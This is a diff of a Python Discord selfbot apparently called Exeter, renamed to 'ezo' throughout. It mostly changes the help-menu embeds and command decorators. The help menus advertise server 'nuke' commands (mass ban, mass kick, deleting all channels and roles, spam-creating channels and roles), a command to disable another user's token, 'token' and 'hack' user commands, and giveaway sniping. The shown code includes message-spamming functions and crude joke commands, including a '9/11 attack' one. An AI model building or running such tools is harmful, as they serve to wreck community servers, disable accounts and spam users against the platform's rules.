-        embed.description = f"\uD83D\uDCB0 `ACCOUNT COMMANDS`\n`> ghost` - makes your name and pfp invisible\n`> pfpsteal <user>` - steals the users pfp\n`> setpfp <link>` - sets the image-link as your pfp\n`> hypesquad <hypesquad>` - changes your current hypesquad\n`> spoofcon <type> <name>` - spoofs your discord connection\n`> leavegroups` - leaves all groups that you're in\n`> cyclenick <text>` - cycles through your nickname by letter\n`> stopcyclenick` - stops cycling your nickname\n`> stream <status>` - sets your streaming status\n`> playing <status>` - sets your playing status\n`> listening <status>` - sets your listening status\n`> watching <status>` - sets your watching status\n`> stopactivity` - resets your status-activity\n`> acceptfriends` - accepts all friend requests\n`> delfriends` - removes all your friends\n`> ignorefriends` - ignores all friends requests\n`> clearblocked` - clears your block-list\n`> read` - marks all messages as read\n`> leavegc` - leaves the current groupchat\n`> adminservers` - lists all servers you have perms in\n`> slotbot <on/off>` - snipes slotbots ({Exeter.slotbot_sniper})\n`> giveaway <on/off>` - snipes giveaways ({Exeter.giveaway_sniper})\n`> mee6 <on/off>` - auto sends messages in the specified channel ({Exeter.mee6}) <#{Exeter.mee6_channel}>\n`> yuikiss <user>` - auto sends yui kisses every minute <@{Exeter.yui_kiss_user}> <#{Exeter.yui_kiss_channel}>\n`> yuihug <user>` - auto sends yui hugs every minute <@{Exeter.yui_hug_user}> <#{Exeter.yui_hug_channel}>\n`> yuistop` - stops any running yui loops"
+        embed.set_image(url="https://images-ext-1.discordapp.net/external/RwSQWZd7x3Z87mUY02np9Td_wxrR0wx299ZULsHaQG8/https/images-ext-1.discordapp.net/external/qWFdH8sxBvZ0SDb2Q0a-rwVW3hKgcyIWHPHx3K2Ql18/https/media.discordapp.net/attachments/788472030315413524/789190778865713192/image0.gif")
+        embed.description = f"\uD83D\uDCB0 `ACCOUNT COMMANDS`\n`> ghost` - makes your name and pfp invisible\n`> pfpsteal <user>` - steals the users pfp\n`> setpfp <link>` - sets the image-link as your pfp\n`> hypesquad <hypesquad>` - changes your current hypesquad\n`> spoofcon <type> <name>` - spoofs your discord connection\n`> leavegroups` - leaves all groups that you're in\n`> cyclenick <text>` - cycles through your nickname by letter\n`> stopcyclenick` - stops cycling your nickname\n`> stream <status>` - sets your streaming status\n`> playing <status>` - sets your playing status\n`> listening <status>` - sets your listening status\n`> watching <status>` - sets your watching status\n`> stopactivity` - resets your status-activity\n`> acceptfriends` - accepts all friend requests\n`> delfriends` - removes all your friends\n`> ignorefriends` - ignores all friends requests\n`> clearblocked` - clears your block-list\n`> read` - marks all messages as read\n`> leavegc` - leaves the current groupchat\n`> adminservers` - lists all servers you have perms in\n`> slotbot <on/off>` - snipes slotbots ({ezo.slotbot_sniper})\n`> giveaway <on/off>` - snipes giveaways ({ezo.giveaway_sniper})\n`> mee6 <on/off>` - auto sends messages in the specified channel ({ezo.mee6}) <#{ezo.mee6_channel}>\n`> yuikiss <user>` - auto sends yui kisses every minute <@{ezo.yui_kiss_user}> <#{ezo.yui_kiss_channel}>\n`> yuihug <user>` - auto sends yui hugs every minute <@{ezo.yui_hug_user}> <#{ezo.yui_hug_channel}>\n`> yuistop` - stops any running yui loops"
         await ctx.send(embed=embed)
     elif str(category).lower() == "text":
         embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
         embed.set_image(url="https://cdn.discordapp.com/attachments/723250694118965300/723278609648713818/image0.gif")
-        embed.description = f"\uD83D\uDCB0 `TEXT COMMANDS`\n`> exeter` - sends the exeter logo\n`> snipehistory` - shows a history of deleted messages\n`> clearsnipehistory` - clears snipe history of current channel\n`> snipe` - shows the last deleted message\n`> editsnipe` - shows the last edited message\n`> msgsniper <on/off> ({Exeter.msgsniper})` - enables a message sniper for deleted messages in DMs\n`> clear` - sends a large message filled with invisible unicode\n`> del <message>` - sends a message and deletes it instantly\n`> 1337speak <message>` - talk like a hacker\n`> minesweeper` - play a game of minesweeper\n`> spam <amount>` - spams a message\n`> dm <user> <content>` - dms a user a message\n`> reverse <message>` - sends the message but in reverse-order\n`> shrug` - returns ¯\_(ツ)_/¯\n`> lenny` - returns ( ͡° ͜ʖ ͡°)\n`> fliptable` - returns (╯°□°）╯︵ ┻━┻\n`> unflip` - returns (╯°□°）╯︵ ┻━┻\n`> bold <message>` - bolds the message\n`> censor <message>` - censors the message\n`> underline <message>` - underlines the message\n`> italicize <message>` - italicizes the message\n`> strike <message>` - strikethroughs the message\n`> quote <message>` - quotes the message\n`> code <message>` - applies code formatting to the message\n`> purge <amount>` - purges the amount of messages\n`> empty` - sends an empty message\n`> tts <content>` - returns an mp4 file of your content\n`> firstmsg` - shows the first message in the channel history\n`> ascii <message>` - creates an ASCII art of your message\n`> wizz` - makes a prank message about wizzing \n`> 8ball <question>` - returns an 8ball answer\n`> slots` - play the slot machine\n`> everyone` - pings everyone through a link\n`> abc` - cyles through the alphabet\n`> 100` - cycles -100\n`> cum` - makes you cum lol?\n`> 9/11` - sends a 9/11 attack\n`> massreact <emoji>` - mass reacts with the specified emoji"
+        embed.description = f"\uD83D\uDCB0 `TEXT COMMANDS`\n`> exeter` - sends the exeter logo\n`> snipehistory` - shows a history of deleted messages\n`> clearsnipehistory` - clears snipe history of current channel\n`> snipe` - shows the last deleted message\n`> editsnipe` - shows the last edited message\n`> msgsniper <on/off> ({ezo.msgsniper})` - enables a message sniper for deleted messages in DMs\n`> clear` - sends a large message filled with invisible unicode\n`> del <message>` - sends a message and deletes it instantly\n`> 1337speak <message>` - talk like a hacker\n`> minesweeper` - play a game of minesweeper\n`> spam <amount>` - spams a message\n`> dm <user> <content>` - dms a user a message\n`> reverse <message>` - sends the message but in reverse-order\n`> shrug` - returns ¯\_(ツ)_/¯\n`> lenny` - returns ( ͡° ͜ʖ ͡°)\n`> fliptable` - returns (╯°□°）╯︵ ┻━┻\n`> unflip` - returns (╯°□°）╯︵ ┻━┻\n`> bold <message>` - bolds the message\n`> censor <message>` - censors the message\n`> underline <message>` - underlines the message\n`> italicize <message>` - italicizes the message\n`> strike <message>` - strikethroughs the message\n`> quote <message>` - quotes the message\n`> code <message>` - applies code formatting to the message\n`> purge <amount>` - purges the amount of messages\n`> empty` - sends an empty message\n`> tts <content>` - returns an mp4 file of your content\n`> firstmsg` - shows the first message in the channel history\n`> ascii <message>` - creates an ASCII art of your message\n`> wizz` - makes a prank message about wizzing \n`> 8ball <question>` - returns an 8ball answer\n`> slots` - play the slot machine\n`> everyone` - pings everyone through a link\n`> abc` - cyles through the alphabet\n`> 100` - cycles -100\n`> cum` - makes you cum lol?\n`> 9/11` - sends a 9/11 attack\n`> massreact <emoji>` - mass reacts with the specified emoji"
         await ctx.send(embed=embed)
     elif str(category).lower() == "music":
         embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
-        embed.set_image(url="https://cdn.discordapp.com/attachments/723250694118965300/723270695185809468/image1.gif")
+        embed.set_image(url="https://media.discordapp.net/attachments/788472030315413524/796202478231617536/IMG_a7oa8y.gif?width=267&height=473")
         embed.description = f"\uD83D\uDCB0 `MUSIC COMMANDS`\n`> play <query>` - plays the specified song if you're in a voice-channel\n`> stop` - stops the music player\n`> skip` - skips the current song playing\n`> lyrics <song>` - shows the specified song's lyrics\n`> youtube <query>` - returns the first youtube search result of the query"
         await ctx.send(embed=embed)
     elif str(category).lower() == "image":
         embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
         embed.set_image(
-            url="https://cdn.discordapp.com/attachments/723250694118965300/739548124493643837/ezgif.com-video-to-gif.gif")
+            url="https://media.discordapp.net/attachments/716126743668326420/799117632724664350/Avatar.gif")
         embed.description = f"\uD83D\uDCB0 `IMAGE MANIPULATION COMMANDS`\n`> tweet <user> <message>` makes a fake tweet\n`> magik <user>` - distorts the specified user\n`> fry <user>` - deep-fry the specified user\n`> blur <user>` - blurs the specified user\n`> pixelate <user>` - pixelates the specified user\n`> Supreme <message>` - makes a *Supreme* logo\n`> darksupreme <message>` - makes a *Dark Supreme* logo\n`> fax <text>` - makes a fax meme\n`> blurpify <user>` - blurpifies the specified user\n`> invert <user>` - inverts the specified user\n`> gay <user>` - makes the specified user gay\n`> communist <user>` - makes the specified user a communist\n`> snow <user>` - adds a snow filter to the specified user\n`> jpegify <user>` - jpegifies the specified user\n`> pornhub <logo-word 1> <logo-word 2>` - makes a PornHub logo\n`> phcomment <user> <message>` - makes a fake PornHub comment\n"
         await ctx.send(embed=embed)
     elif str(category).lower() == "nsfw":
@@ -875,17 +859,17 @@ async def help(ctx, category=None):
         await ctx.send(embed=embed)
     elif str(category).lower() == "misc":
         embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
-        embed.set_image(url="https://cdn.discordapp.com/attachments/723250694118965300/723265016979259544/image0.gif")
-        embed.description = f"\uD83D\uDCB0 `MISCELLANEOUS COMMANDS`\n`> copycat <user>` - copies the users messages ({Exeter.copycat})\n`> stopcopycat` - stops copycatting\n`> fakename` - makes a fakename with other members's names\n`> geoip <ip>` - looks up the ip's location\n`> pingweb <website-url>` pings a website to see if it's up\n`> anticatfish <user>` - reverse google searches the user's pfp\n`> stealemoji` - <emoji> <name> - steals the specified emoji\n`> hexcolor <hex-code>` - returns the color of the hex-code\n`> dick <user>` - returns the user's dick size\n`> bitcoin` - shows the current bitcoin exchange rate\n`> hastebin <message>` - posts your message to hastebin\n`> rolecolor <role>` - returns the role's color\n`> nitro` - generates a random nitro code\n`> feed <user>` - feeds the user\n`> tickle <user>` - tickles the user\n`> slap <user>` - slaps the user\n`> hug <user>` - hugs the user\n`> cuddle <user>` - cuddles the user\n`> smug <user>` - smugs at the user\n`> pat <user>` - pat the user\n`> kiss <user>` - kiss the user\n`> topic` - sends a conversation starter\n`> wyr` - sends a would you rather\n`> gif <query>` - sends a gif based on the query\n`> sendall <message>` - sends a message in every channel\n`> poll <msg: xyz 1: xyz 2: xyz>` - creates a poll\n`> bots` - shows all bots in the server\n`> image <query>` - returns an image\n`> hack <user>` - hacks the user\n`> token <user>` - returns the user's token\n`> cat` - returns random cat pic\n`> sadcat` - returns a random sad cat\n`> dog` - returns random dog pic\n`> fox` - returns random fox pic\n`> bird` - returns random bird pic\n"
+        embed.set_image(url="https://images-ext-2.discordapp.net/external/ILDP4spIfwzHMZHrGsjNlO9u6ixDiON6gmWNk9XEKFs/%3Fwidth%3D337%26height%3D422/https/media.discordapp.net/attachments/788472030315413524/796202934056124446/IMG_ymwjjo.gif")
+        embed.description = f"\uD83D\uDCB0 `MISCELLANEOUS COMMANDS`\n`> copycat <user>` - copies the users messages ({ezo.copycat})\n`> stopcopycat` - stops copycatting\n`> fakename` - makes a fakename with other members's names\n`> geoip <ip>` - looks up the ip's location\n`> pingweb <website-url>` pings a website to see if it's up\n`> anticatfish <user>` - reverse google searches the user's pfp\n`> stealemoji` - <emoji> <name> - steals the specified emoji\n`> hexcolor <hex-code>` - returns the color of the hex-code\n`> dick <user>` - returns the user's dick size\n`> bitcoin` - shows the current bitcoin exchange rate\n`> hastebin <message>` - posts your message to hastebin\n`> rolecolor <role>` - returns the role's color\n`> nitro` - generates a random nitro code\n`> feed <user>` - feeds the user\n`> tickle <user>` - tickles the user\n`> slap <user>` - slaps the user\n`> hug <user>` - hugs the user\n`> cuddle <user>` - cuddles the user\n`> smug <user>` - smugs at the user\n`> pat <user>` - pat the user\n`> kiss <user>` - kiss the user\n`> topic` - sends a conversation starter\n`> wyr` - sends a would you rather\n`> gif <query>` - sends a gif based on the query\n`> sendall <message>` - sends a message in every channel\n`> poll <msg: xyz 1: xyz 2: xyz>` - creates a poll\n`> bots` - shows all bots in the server\n`> image <query>` - returns an image\n`> hack <user>` - hacks the user\n`> token <user>` - returns the user's token\n`> cat` - returns random cat pic\n`> sadcat` - returns a random sad cat\n`> dog` - returns random dog pic\n`> fox` - returns random fox pic\n`> bird` - returns random bird pic\n"
         await ctx.send(embed=embed)
     elif str(category).lower() == "antinuke":
         embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
-        embed.set_image(url="https://cdn.discordapp.com/attachments/723250694118965300/723274816055935067/image0.gif")
-        embed.description = f"\uD83D\uDCB0 `ANTI-NUKE COMMANDS`\n`> antiraid <on/off>` - toggles anti-nuke ({Exeter.antiraid})\n`> whitelist <user>` - whitelists the specified user\n**NOTE** Whitelisting a user will completely exclude them from anti-nuke detections, be weary on who you whitelist.\n`> whitelisted <-g>` - see who's whitleisted and in what guild\n`> unwhitelist <user>` - unwhitelists the user\n`> clearwhitelist` - clears the whitelist hash"
+        embed.set_image(url="https://media.discordapp.net/attachments/788472030315413524/797602438906380298/image0.gif")
+        embed.description = f"\uD83D\uDCB0 `ANTI-NUKE COMMANDS`\n`> antiraid <on/off>` - toggles anti-nuke ({ezo.antiraid})\n`> whitelist <user>` - whitelists the specified user\n**NOTE** Whitelisting a user will completely exclude them from anti-nuke detections, be weary on who you whitelist.\n`> whitelisted <-g>` - see who's whitleisted and in what guild\n`> unwhitelist <user>` - unwhitelists the user\n`> clearwhitelist` - clears the whitelist hash"
         await ctx.send(embed=embed)
     elif str(category).lower() == "nuke":
         embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
-        embed.set_image(url="https://cdn.discordapp.com/attachments/723250694118965300/723256768742031451/image0.gif")
+        embed.set_image(url="https://images-ext-2.discordapp.net/external/JGxt2zB-sP6bpR6N-YMOTiKcD6BhwqfpT_n67v7LbqU/https/images-ext-2.discordapp.net/external/Jam64HJVyHN5Ux4sKjkh4G1xwXQeymho4gJn5Gb4JdU/https/media.discordapp.net/attachments/788472030315413524/795135403131666462/image0.gif")
         embed.description = f"\uD83D\uDCB0 `NUKE COMMANDS`\n`> tokenfuck <token>` - disables the token\n`> nuke` - nukes the server\n`> massban` - bans everyone in the server\n`> dynoban` - mass bans with dyno one message at a time\n`> masskick` - kicks everyone in the server\n`> spamroles` - spam makes 250 roles\n`> spamchannels` - spam makes 250 text channels\n`> delchannels` - deletes all channels in the server\n`> delroles` - deletes all roles in the server\n`> purgebans` - unbans everyone\n`> renamechannels <name>` - renames all channels\n`> servername <name>` - renames the server to the specified name\n`> nickall <name>` - sets all user's nicknames to the specified name\n`> changeregion <amount>` - spam changes regions in groupchats\n`> kickgc` - kicks everyone in the gc\n`> spamgcname` - spam changes the groupchat name\n`> massmention <message>` - mass mentions random people\n`> giveadmin` - gives all admin roles in the server"
         await ctx.send(embed=embed)
 
@@ -908,7 +892,7 @@ async def help(ctx, category=None):
 # NUKE
 
 
-@Exeter.command()
+@ezo.command()
 async def exeter(ctx):
     await ctx.message.delete()
     await ctx.send("""
@@ -921,7 +905,7 @@ async def exeter(ctx):
 """)
 
 
-@Exeter.command(aliases=["giphy", "tenor", "searchgif"])
+@ezo.command(aliases=["giphy", "tenor", "searchgif"])
 async def gif(ctx, query=None):
     await ctx.message.delete()
     if query is None:
@@ -936,7 +920,7 @@ async def gif(ctx, query=None):
         await ctx.send(res['data'][0]["url"])
 
 
-@Exeter.command(aliases=["img", "searchimg", "searchimage", "imagesearch", "imgsearch"])
+@ezo.command(aliases=["img", "searchimg", "searchimage", "imagesearch", "imgsearch"])
 async def image(ctx, *, args):
     await ctx.message.delete()
     url = 'https://unsplash.com/search/photos/' + args.replace(" ", "%20")
@@ -957,31 +941,31 @@ async def image(ctx, *, args):
         await ctx.send("Nothing found for **" + args + "**")
 
 
-@Exeter.command(aliases=["addemoji", "stealemote", "addemote"])
+@ezo.command(aliases=["addemoji", "stealemote", "addemote"])
 async def stealemoji(ctx):
     await ctx.message.delete()
     custom_regex = "<(?P<animated>a?):(?P<name>[a-zA-Z0-9_]{2,32}):(?P<id>[0-9]{18,22})>"
     unicode_regex = "(?:\U0001f1e6[\U0001f1e8-\U0001f1ec\U0001f1ee\U0001f1f1\U0001f1f2\U0001f1f4\U0001f1f6-\U0001f1fa\U0001f1fc\U0001f1fd\U0001f1ff])|(?:\U0001f1e7[\U0001f1e6\U0001f1e7\U0001f1e9-\U0001f1ef\U0001f1f1-\U0001f1f4\U0001f1f6-\U0001f1f9\U0001f1fb\U0001f1fc\U0001f1fe\U0001f1ff])|(?:\U0001f1e8[\U0001f1e6\U0001f1e8\U0001f1e9\U0001f1eb-\U0001f1ee\U0001f1f0-\U0001f1f5\U0001f1f7\U0001f1fa-\U0001f1ff])|(?:\U0001f1e9[\U0001f1ea\U0001f1ec\U0001f1ef\U0001f1f0\U0001f1f2\U0001f1f4\U0001f1ff])|(?:\U0001f1ea[\U0001f1e6\U0001f1e8\U0001f1ea\U0001f1ec\U0001f1ed\U0001f1f7-\U0001f1fa])|(?:\U0001f1eb[\U0001f1ee-\U0001f1f0\U0001f1f2\U0001f1f4\U0001f1f7])|(?:\U0001f1ec[\U0001f1e6\U0001f1e7\U0001f1e9-\U0001f1ee\U0001f1f1-\U0001f1f3\U0001f1f5-\U0001f1fa\U0001f1fc\U0001f1fe])|(?:\U0001f1ed[\U0001f1f0\U0001f1f2\U0001f1f3\U0001f1f7\U0001f1f9\U0001f1fa])|(?:\U0001f1ee[\U0001f1e8-\U0001f1ea\U0001f1f1-\U0001f1f4\U0001f1f6-\U0001f1f9])|(?:\U0001f1ef[\U0001f1ea\U0001f1f2\U0001f1f4\U0001f1f5])|(?:\U0001f1f0[\U0001f1ea\U0001f1ec-\U0001f1ee\U0001f1f2\U0001f1f3\U0001f1f5\U0001f1f7\U0001f1fc\U0001f1fe\U0001f1ff])|(?:\U0001f1f1[\U0001f1e6-\U0001f1e8\U0001f1ee\U0001f1f0\U0001f1f7-\U0001f1fb\U0001f1fe])|(?:\U0001f1f2[\U0001f1e6\U0001f1e8-\U0001f1ed\U0001f1f0-\U0001f1ff])|(?:\U0001f1f3[\U0001f1e6\U0001f1e8\U0001f1ea-\U0001f1ec\U0001f1ee\U0001f1f1\U0001f1f4\U0001f1f5\U0001f1f7\U0001f1fa\U0001f1ff])|\U0001f1f4\U0001f1f2|(?:\U0001f1f4[\U0001f1f2])|(?:\U0001f1f5[\U0001f1e6\U0001f1ea-\U0001f1ed\U0001f1f0-\U0001f1f3\U0001f1f7-\U0001f1f9\U0001f1fc\U0001f1fe])|\U0001f1f6\U0001f1e6|(?:\U0001f1f6[\U0001f1e6])|(?:\U0001f1f7[\U0001f1ea\U0001f1f4\U0001f1f8\U0001f1fa\U0001f1fc])|(?:\U0001f1f8[\U0001f1e6-\U0001f1ea\U0001f1ec-\U0001f1f4\U0001f1f7-\U0001f1f9\U0001f1fb\U0001f1fd-\U0001f1ff])|(?:\U0001f1f9[\U0001f1e6\U0001f1e8\U0001f1e9\U0001f1eb-\U0001f1ed\U0001f1ef-\U0001f1f4\U0001f1f7\U0001f1f9\U0001f1fb\U0001f1fc\U0001f1ff])|(?:\U0001f1fa[\U0001f1e6\U0001f1ec\U0001f1f2\U0001f1f8\U0001f1fe\U0001f1ff])|(?:\U0001f1fb[\U0001f1e6\U0001f1e8\U0001f1ea\U0001f1ec\U0001f1ee\U0001f1f3\U0001f1fa])|(?:\U0001f1fc[\U0001f1eb\U0001f1f8])|\U0001f1fd\U0001f1f0|(?:\U0001f1fd[\U0001f1f0])|(?:\U0001f1fe[\U0001f1ea\U0001f1f9])|(?:\U0001f1ff[\U0001f1e6\U0001f1f2\U0001f1fc])|(?:\U0001f3f3\ufe0f\u200d\U0001f308)|(?:\U0001f441\u200d\U0001f5e8)|(?:[\U0001f468\U0001f469]\u200d\u2764\ufe0f\u200d(?:\U0001f48b\u200d)?[\U0001f468\U0001f469])|(?:(?:(?:\U0001f468\u200d[\U0001f468\U0001f469])|(?:\U0001f469\u200d\U0001f469))(?:(?:\u200d\U0001f467(?:\u200d[\U0001f467\U0001f466])?)|(?:\u200d\U0001f466\u200d\U0001f466)))|(?:(?:(?:\U0001f468\u200d\U0001f468)|(?:\U0001f469\u200d\U0001f469))\u200d\U0001f466)|[\u2194-\u2199]|[\u23e9-\u23f3]|[\u23f8-\u23fa]|[\u25fb-\u25fe]|[\u2600-\u2604]|[\u2638-\u263a]|[\u2648-\u2653]|[\u2692-\u2694]|[\u26f0-\u26f5]|[\u26f7-\u26fa]|[\u2708-\u270d]|[\u2753-\u2755]|[\u2795-\u2797]|[\u2b05-\u2b07]|[\U0001f191-\U0001f19a]|[\U0001f1e6-\U0001f1ff]|[\U0001f232-\U0001f23a]|[\U0001f300-\U0001f321]|[\U0001f324-\U0001f393]|[\U0001f399-\U0001f39b]|[\U0001f39e-\U0001f3f0]|[\U0001f3f3-\U0001f3f5]|[\U0001f3f7-\U0001f3fa]|[\U0001f400-\U0001f4fd]|[\U0001f4ff-\U0001f53d]|[\U0001f549-\U0001f54e]|[\U0001f550-\U0001f567]|[\U0001f573-\U0001f57a]|[\U0001f58a-\U0001f58d]|[\U0001f5c2-\U0001f5c4]|[\U0001f5d1-\U0001f5d3]|[\U0001f5dc-\U0001f5de]|[\U0001f5fa-\U0001f64f]|[\U0001f680-\U0001f6c5]|[\U0001f6cb-\U0001f6d2]|[\U0001f6e0-\U0001f6e5]|[\U0001f6f3-\U0001f6f6]|[\U0001f910-\U0001f91e]|[\U0001f920-\U0001f927]|[\U0001f933-\U0001f93a]|[\U0001f93c-\U0001f93e]|[\U0001f940-\U0001f945]|[\U0001f947-\U0001f94b]|[\U0001f950-\U0001f95e]|[\U0001f980-\U0001f991]|\u00a9|\u00ae|\u203c|\u2049|\u2122|\u2139|\u21a9|\u21aa|\u231a|\u231b|\u2328|\u23cf|\u24c2|\u25aa|\u25ab|\u25b6|\u25c0|\u260e|\u2611|\u2614|\u2615|\u2618|\u261d|\u2620|\u2622|\u2623|\u2626|\u262a|\u262e|\u262f|\u2660|\u2663|\u2665|\u2666|\u2668|\u267b|\u267f|\u2696|\u2697|\u2699|\u269b|\u269c|\u26a0|\u26a1|\u26aa|\u26ab|\u26b0|\u26b1|\u26bd|\u26be|\u26c4|\u26c5|\u26c8|\u26ce|\u26cf|\u26d1|\u26d3|\u26d4|\u26e9|\u26ea|\u26fd|\u2702|\u2705|\u270f|\u2712|\u2714|\u2716|\u271d|\u2721|\u2728|\u2733|\u2734|\u2744|\u2747|\u274c|\u274e|\u2757|\u2763|\u2764|\u27a1|\u27b0|\u27bf|\u2934|\u2935|\u2b1b|\u2b1c|\u2b50|\u2b55|\u3030|\u303d|\u3297|\u3299|\U0001f004|\U0001f0cf|\U0001f170|\U0001f171|\U0001f17e|\U0001f17f|\U0001f18e|\U0001f201|\U0001f202|\U0001f21a|\U0001f22f|\U0001f250|\U0001f251|\U0001f396|\U0001f397|\U0001f56f|\U0001f570|\U0001f587|\U0001f590|\U0001f595|\U0001f596|\U0001f5a4|\U0001f5a5|\U0001f5a8|\U0001f5b1|\U0001f5b2|\U0001f5bc|\U0001f5e1|\U0001f5e3|\U0001f5e8|\U0001f5ef|\U0001f5f3|\U0001f6e9|\U0001f6eb|\U0001f6ec|\U0001f6f0|\U0001f930|\U0001f9c0|[#|0-9]\u20e3"
 
 
-@Exeter.command(aliases=["stopcopycatuser", "stopcopyuser", "stopcopy"])
+@ezo.command(aliases=["stopcopycatuser", "stopcopyuser", "stopcopy"])
 async def stopcopycat(ctx):
     await ctx.message.delete()
-    if Exeter.user is None:
+    if ezo.user is None:
         await ctx.send("You weren't copying anyone to begin with")
         return
-    await ctx.send("Stopped copying " + str(Exeter.copycat))
-    Exeter.copycat = None
+    await ctx.send("Stopped copying " + str(ezo.copycat))
+    ezo.copycat = None
 
 
-@Exeter.command(aliases=["copycatuser", "copyuser"])
+@ezo.command(aliases=["copycatuser", "copyuser"])
 async def copycat(ctx, user: discord.User):
     await ctx.message.delete()
-    Exeter.copycat = user
-    await ctx.send("Now copying " + str(Exeter.copycat))
+    ezo.copycat = user
+    await ctx.send("Now copying " + str(ezo.copycat))
 
 
-@Exeter.command(aliases=["9/11", "911", "terrorist"])
+@ezo.command(aliases=["9/11", "911", "terrorist"])
 async def nine_eleven(ctx):
     await ctx.message.delete()
     invis = ""  # char(173)
@@ -1010,7 +994,7 @@ async def nine_eleven(ctx):
         ''')
 
 
-@Exeter.command(aliases=["jerkoff", "ejaculate", "orgasm"])
+@ezo.command(aliases=["jerkoff", "ejaculate", "orgasm"])
 async def cum(ctx):
     await ctx.message.delete()
     message = await ctx.send('''
@@ -1085,13 +1069,13 @@ async def cum(ctx):
      ''')
 
 
-@Exeter.command()
+@ezo.command()
 async def clear(ctx):
     await ctx.message.delete()
     await ctx.send('ﾠﾠ' + '\n' * 400 + 'ﾠﾠ')
 
 
-@Exeter.command()
+@ezo.command()
 async def sendall(ctx, *, message):
     await ctx.message.delete()
     try:
@@ -1102,7 +1086,7 @@ async def sendall(ctx, *, message):
         pass
 
 
-@Exeter.command(aliases=["spamchangegcname", "changegcname"])
+@ezo.command(aliases=["spamchangegcname", "changegcname"])
 async def spamgcname(ctx):
     await ctx.message.delete()
     if isinstance(ctx.message.channel, discord.GroupChannel):
@@ -1113,7 +1097,7 @@ async def spamgcname(ctx):
             await ctx.message.channel.edit(name=name)
 
 
-@Exeter.command(aliases=["fakename"])
+@ezo.command(aliases=["fakename"])
 async def genname(ctx):
     await ctx.message.delete()
     first, second = random.choices(ctx.guild.members, k=2)
@@ -1122,7 +1106,7 @@ async def genname(ctx):
     await ctx.send(discord.utils.escape_mentions(second + first))
 
 
-@Exeter.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
+@ezo.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
 async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
     await ctx.message.delete()
     r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
@@ -1148,7 +1132,7 @@ async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
     return await ctx.send(embed=em)
 
 
-@Exeter.command()
+@ezo.command()
 async def pingweb(ctx, website=None):
     await ctx.message.delete()
     if website is None:
@@ -1164,7 +1148,7 @@ async def pingweb(ctx, website=None):
             await ctx.send(f'Website is operational ({r})', delete_after=3)
 
 
-@Exeter.command()
+@ezo.command()
 async def tweet(ctx, username: str = None, *, message: str = None):
     await ctx.message.delete()
     if username is None or message is None:
@@ -1183,7 +1167,7 @@ async def tweet(ctx, username: str = None, *, message: str = None):
                 await ctx.send(res['message'])
 
 
-@Exeter.command(aliases=["distort"])
+@ezo.command(aliases=["distort"])
 async def magik(ctx, user: discord.Member = None):
     await ctx.message.delete()
     endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=3&image="
@@ -1215,14 +1199,14 @@ async def magik(ctx, user: discord.Member = None):
             await ctx.send(res['message'])
 
 
-@Exeter.command(aliases=['markasread', 'ack'])
+@ezo.command(aliases=['markasread', 'ack'])
 async def read(ctx):
     await ctx.message.delete()
-    for guild in Exeter.guilds:
+    for guild in ezo.guilds:
         await guild.ack()
 
 
-@Exeter.command(aliases=["deepfry"])
+@ezo.command(aliases=["deepfry"])
 async def fry(ctx, user: discord.Member = None):
     await ctx.message.delete()
     endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
@@ -1254,7 +1238,7 @@ async def fry(ctx, user: discord.Member = None):
             await ctx.send(res['message'])
 
 
-@Exeter.command()
+@ezo.command()
 async def blur(ctx, user: discord.Member = None):
     await ctx.message.delete()
     endpoint = "https://api.alexflipnote.dev/filter/blur?image="
@@ -1282,7 +1266,7 @@ async def blur(ctx, user: discord.Member = None):
             await ctx.send(endpoint)
 
 
-@Exeter.command(aliases=["pixel"])
+@ezo.command(aliases=["pixel"])
 async def pixelate(ctx, user: discord.Member = None):
     await ctx.message.delete()
     endpoint = "https://api.alexflipnote.dev/filter/pixelate?image="
@@ -1310,7 +1294,7 @@ async def pixelate(ctx, user: discord.Member = None):
             await ctx.send(endpoint)
 
 
-@Exeter.command()
+@ezo.command()
 async def supreme(ctx, *, args=None):
     await ctx.message.delete()
     if args is None:
@@ -1327,7 +1311,7 @@ async def supreme(ctx, *, args=None):
         await ctx.send(endpoint)
 
 
-@Exeter.command()
+@ezo.command()
 async def darksupreme(ctx, *, args=None):
     await ctx.message.delete()
     if args is None:
@@ -1344,7 +1328,7 @@ async def darksupreme(ctx, *, args=None):
         await ctx.send(endpoint)
 
 
-@Exeter.command(aliases=["facts"])
+@ezo.command(aliases=["facts"])
 async def fax(ctx, *, args=None):
     await ctx.message.delete()
     if args is None:
@@ -1361,7 +1345,7 @@ async def fax(ctx, *, args=None):
         await ctx.send(endpoint)
 
 
-@Exeter.command(aliases=["blurp"])
+@ezo.command(aliases=["blurp"])
 async def blurpify(ctx, user: discord.Member = None):
     await ctx.message.delete()
     endpoint = "https://nekobot.xyz/api/imagegen?type=blurpify&image="
@@ -1393,7 +1377,7 @@ async def blurpify(ctx, user: discord.Member = None):
             await ctx.send(res['message'])
 
 
-@Exeter.command()
+@ezo.command()
 async def invert(ctx, user: discord.Member = None):
     await ctx.message.delete()
     endpoint = "https://api.alexflipnote.dev/filter/invert?image="
@@ -1421,7 +1405,7 @@ async def invert(ctx, user: discord.Member = None):
             await ctx.send(endpoint)
 
 
-@Exeter.command()
+@ezo.command()
 async def gay(ctx, user: discord.Member = None):
     await ctx.message.delete()
     endpoint = "https://api.alexflipnote.dev/filter/gay?image="
@@ -1449,7 +1433,7 @@ async def gay(ctx, user: discord.Member = None):
             await ctx.send(endpoint)
 
 
-@Exeter.command()
+@ezo.command()
 async def communist(ctx, user: discord.Member = None):
     await ctx.message.delete()
     endpoint = "https://api.alexflipnote.dev/filter/communist?image="
@@ -1477,7 +1461,7 @@ async def communist(ctx, user: discord.Member = None):
             await ctx.send(endpoint)
 
 
-@Exeter.command()
+@ezo.command()
 async def snow(ctx, user: discord.Member = None):
     await ctx.message.delete()
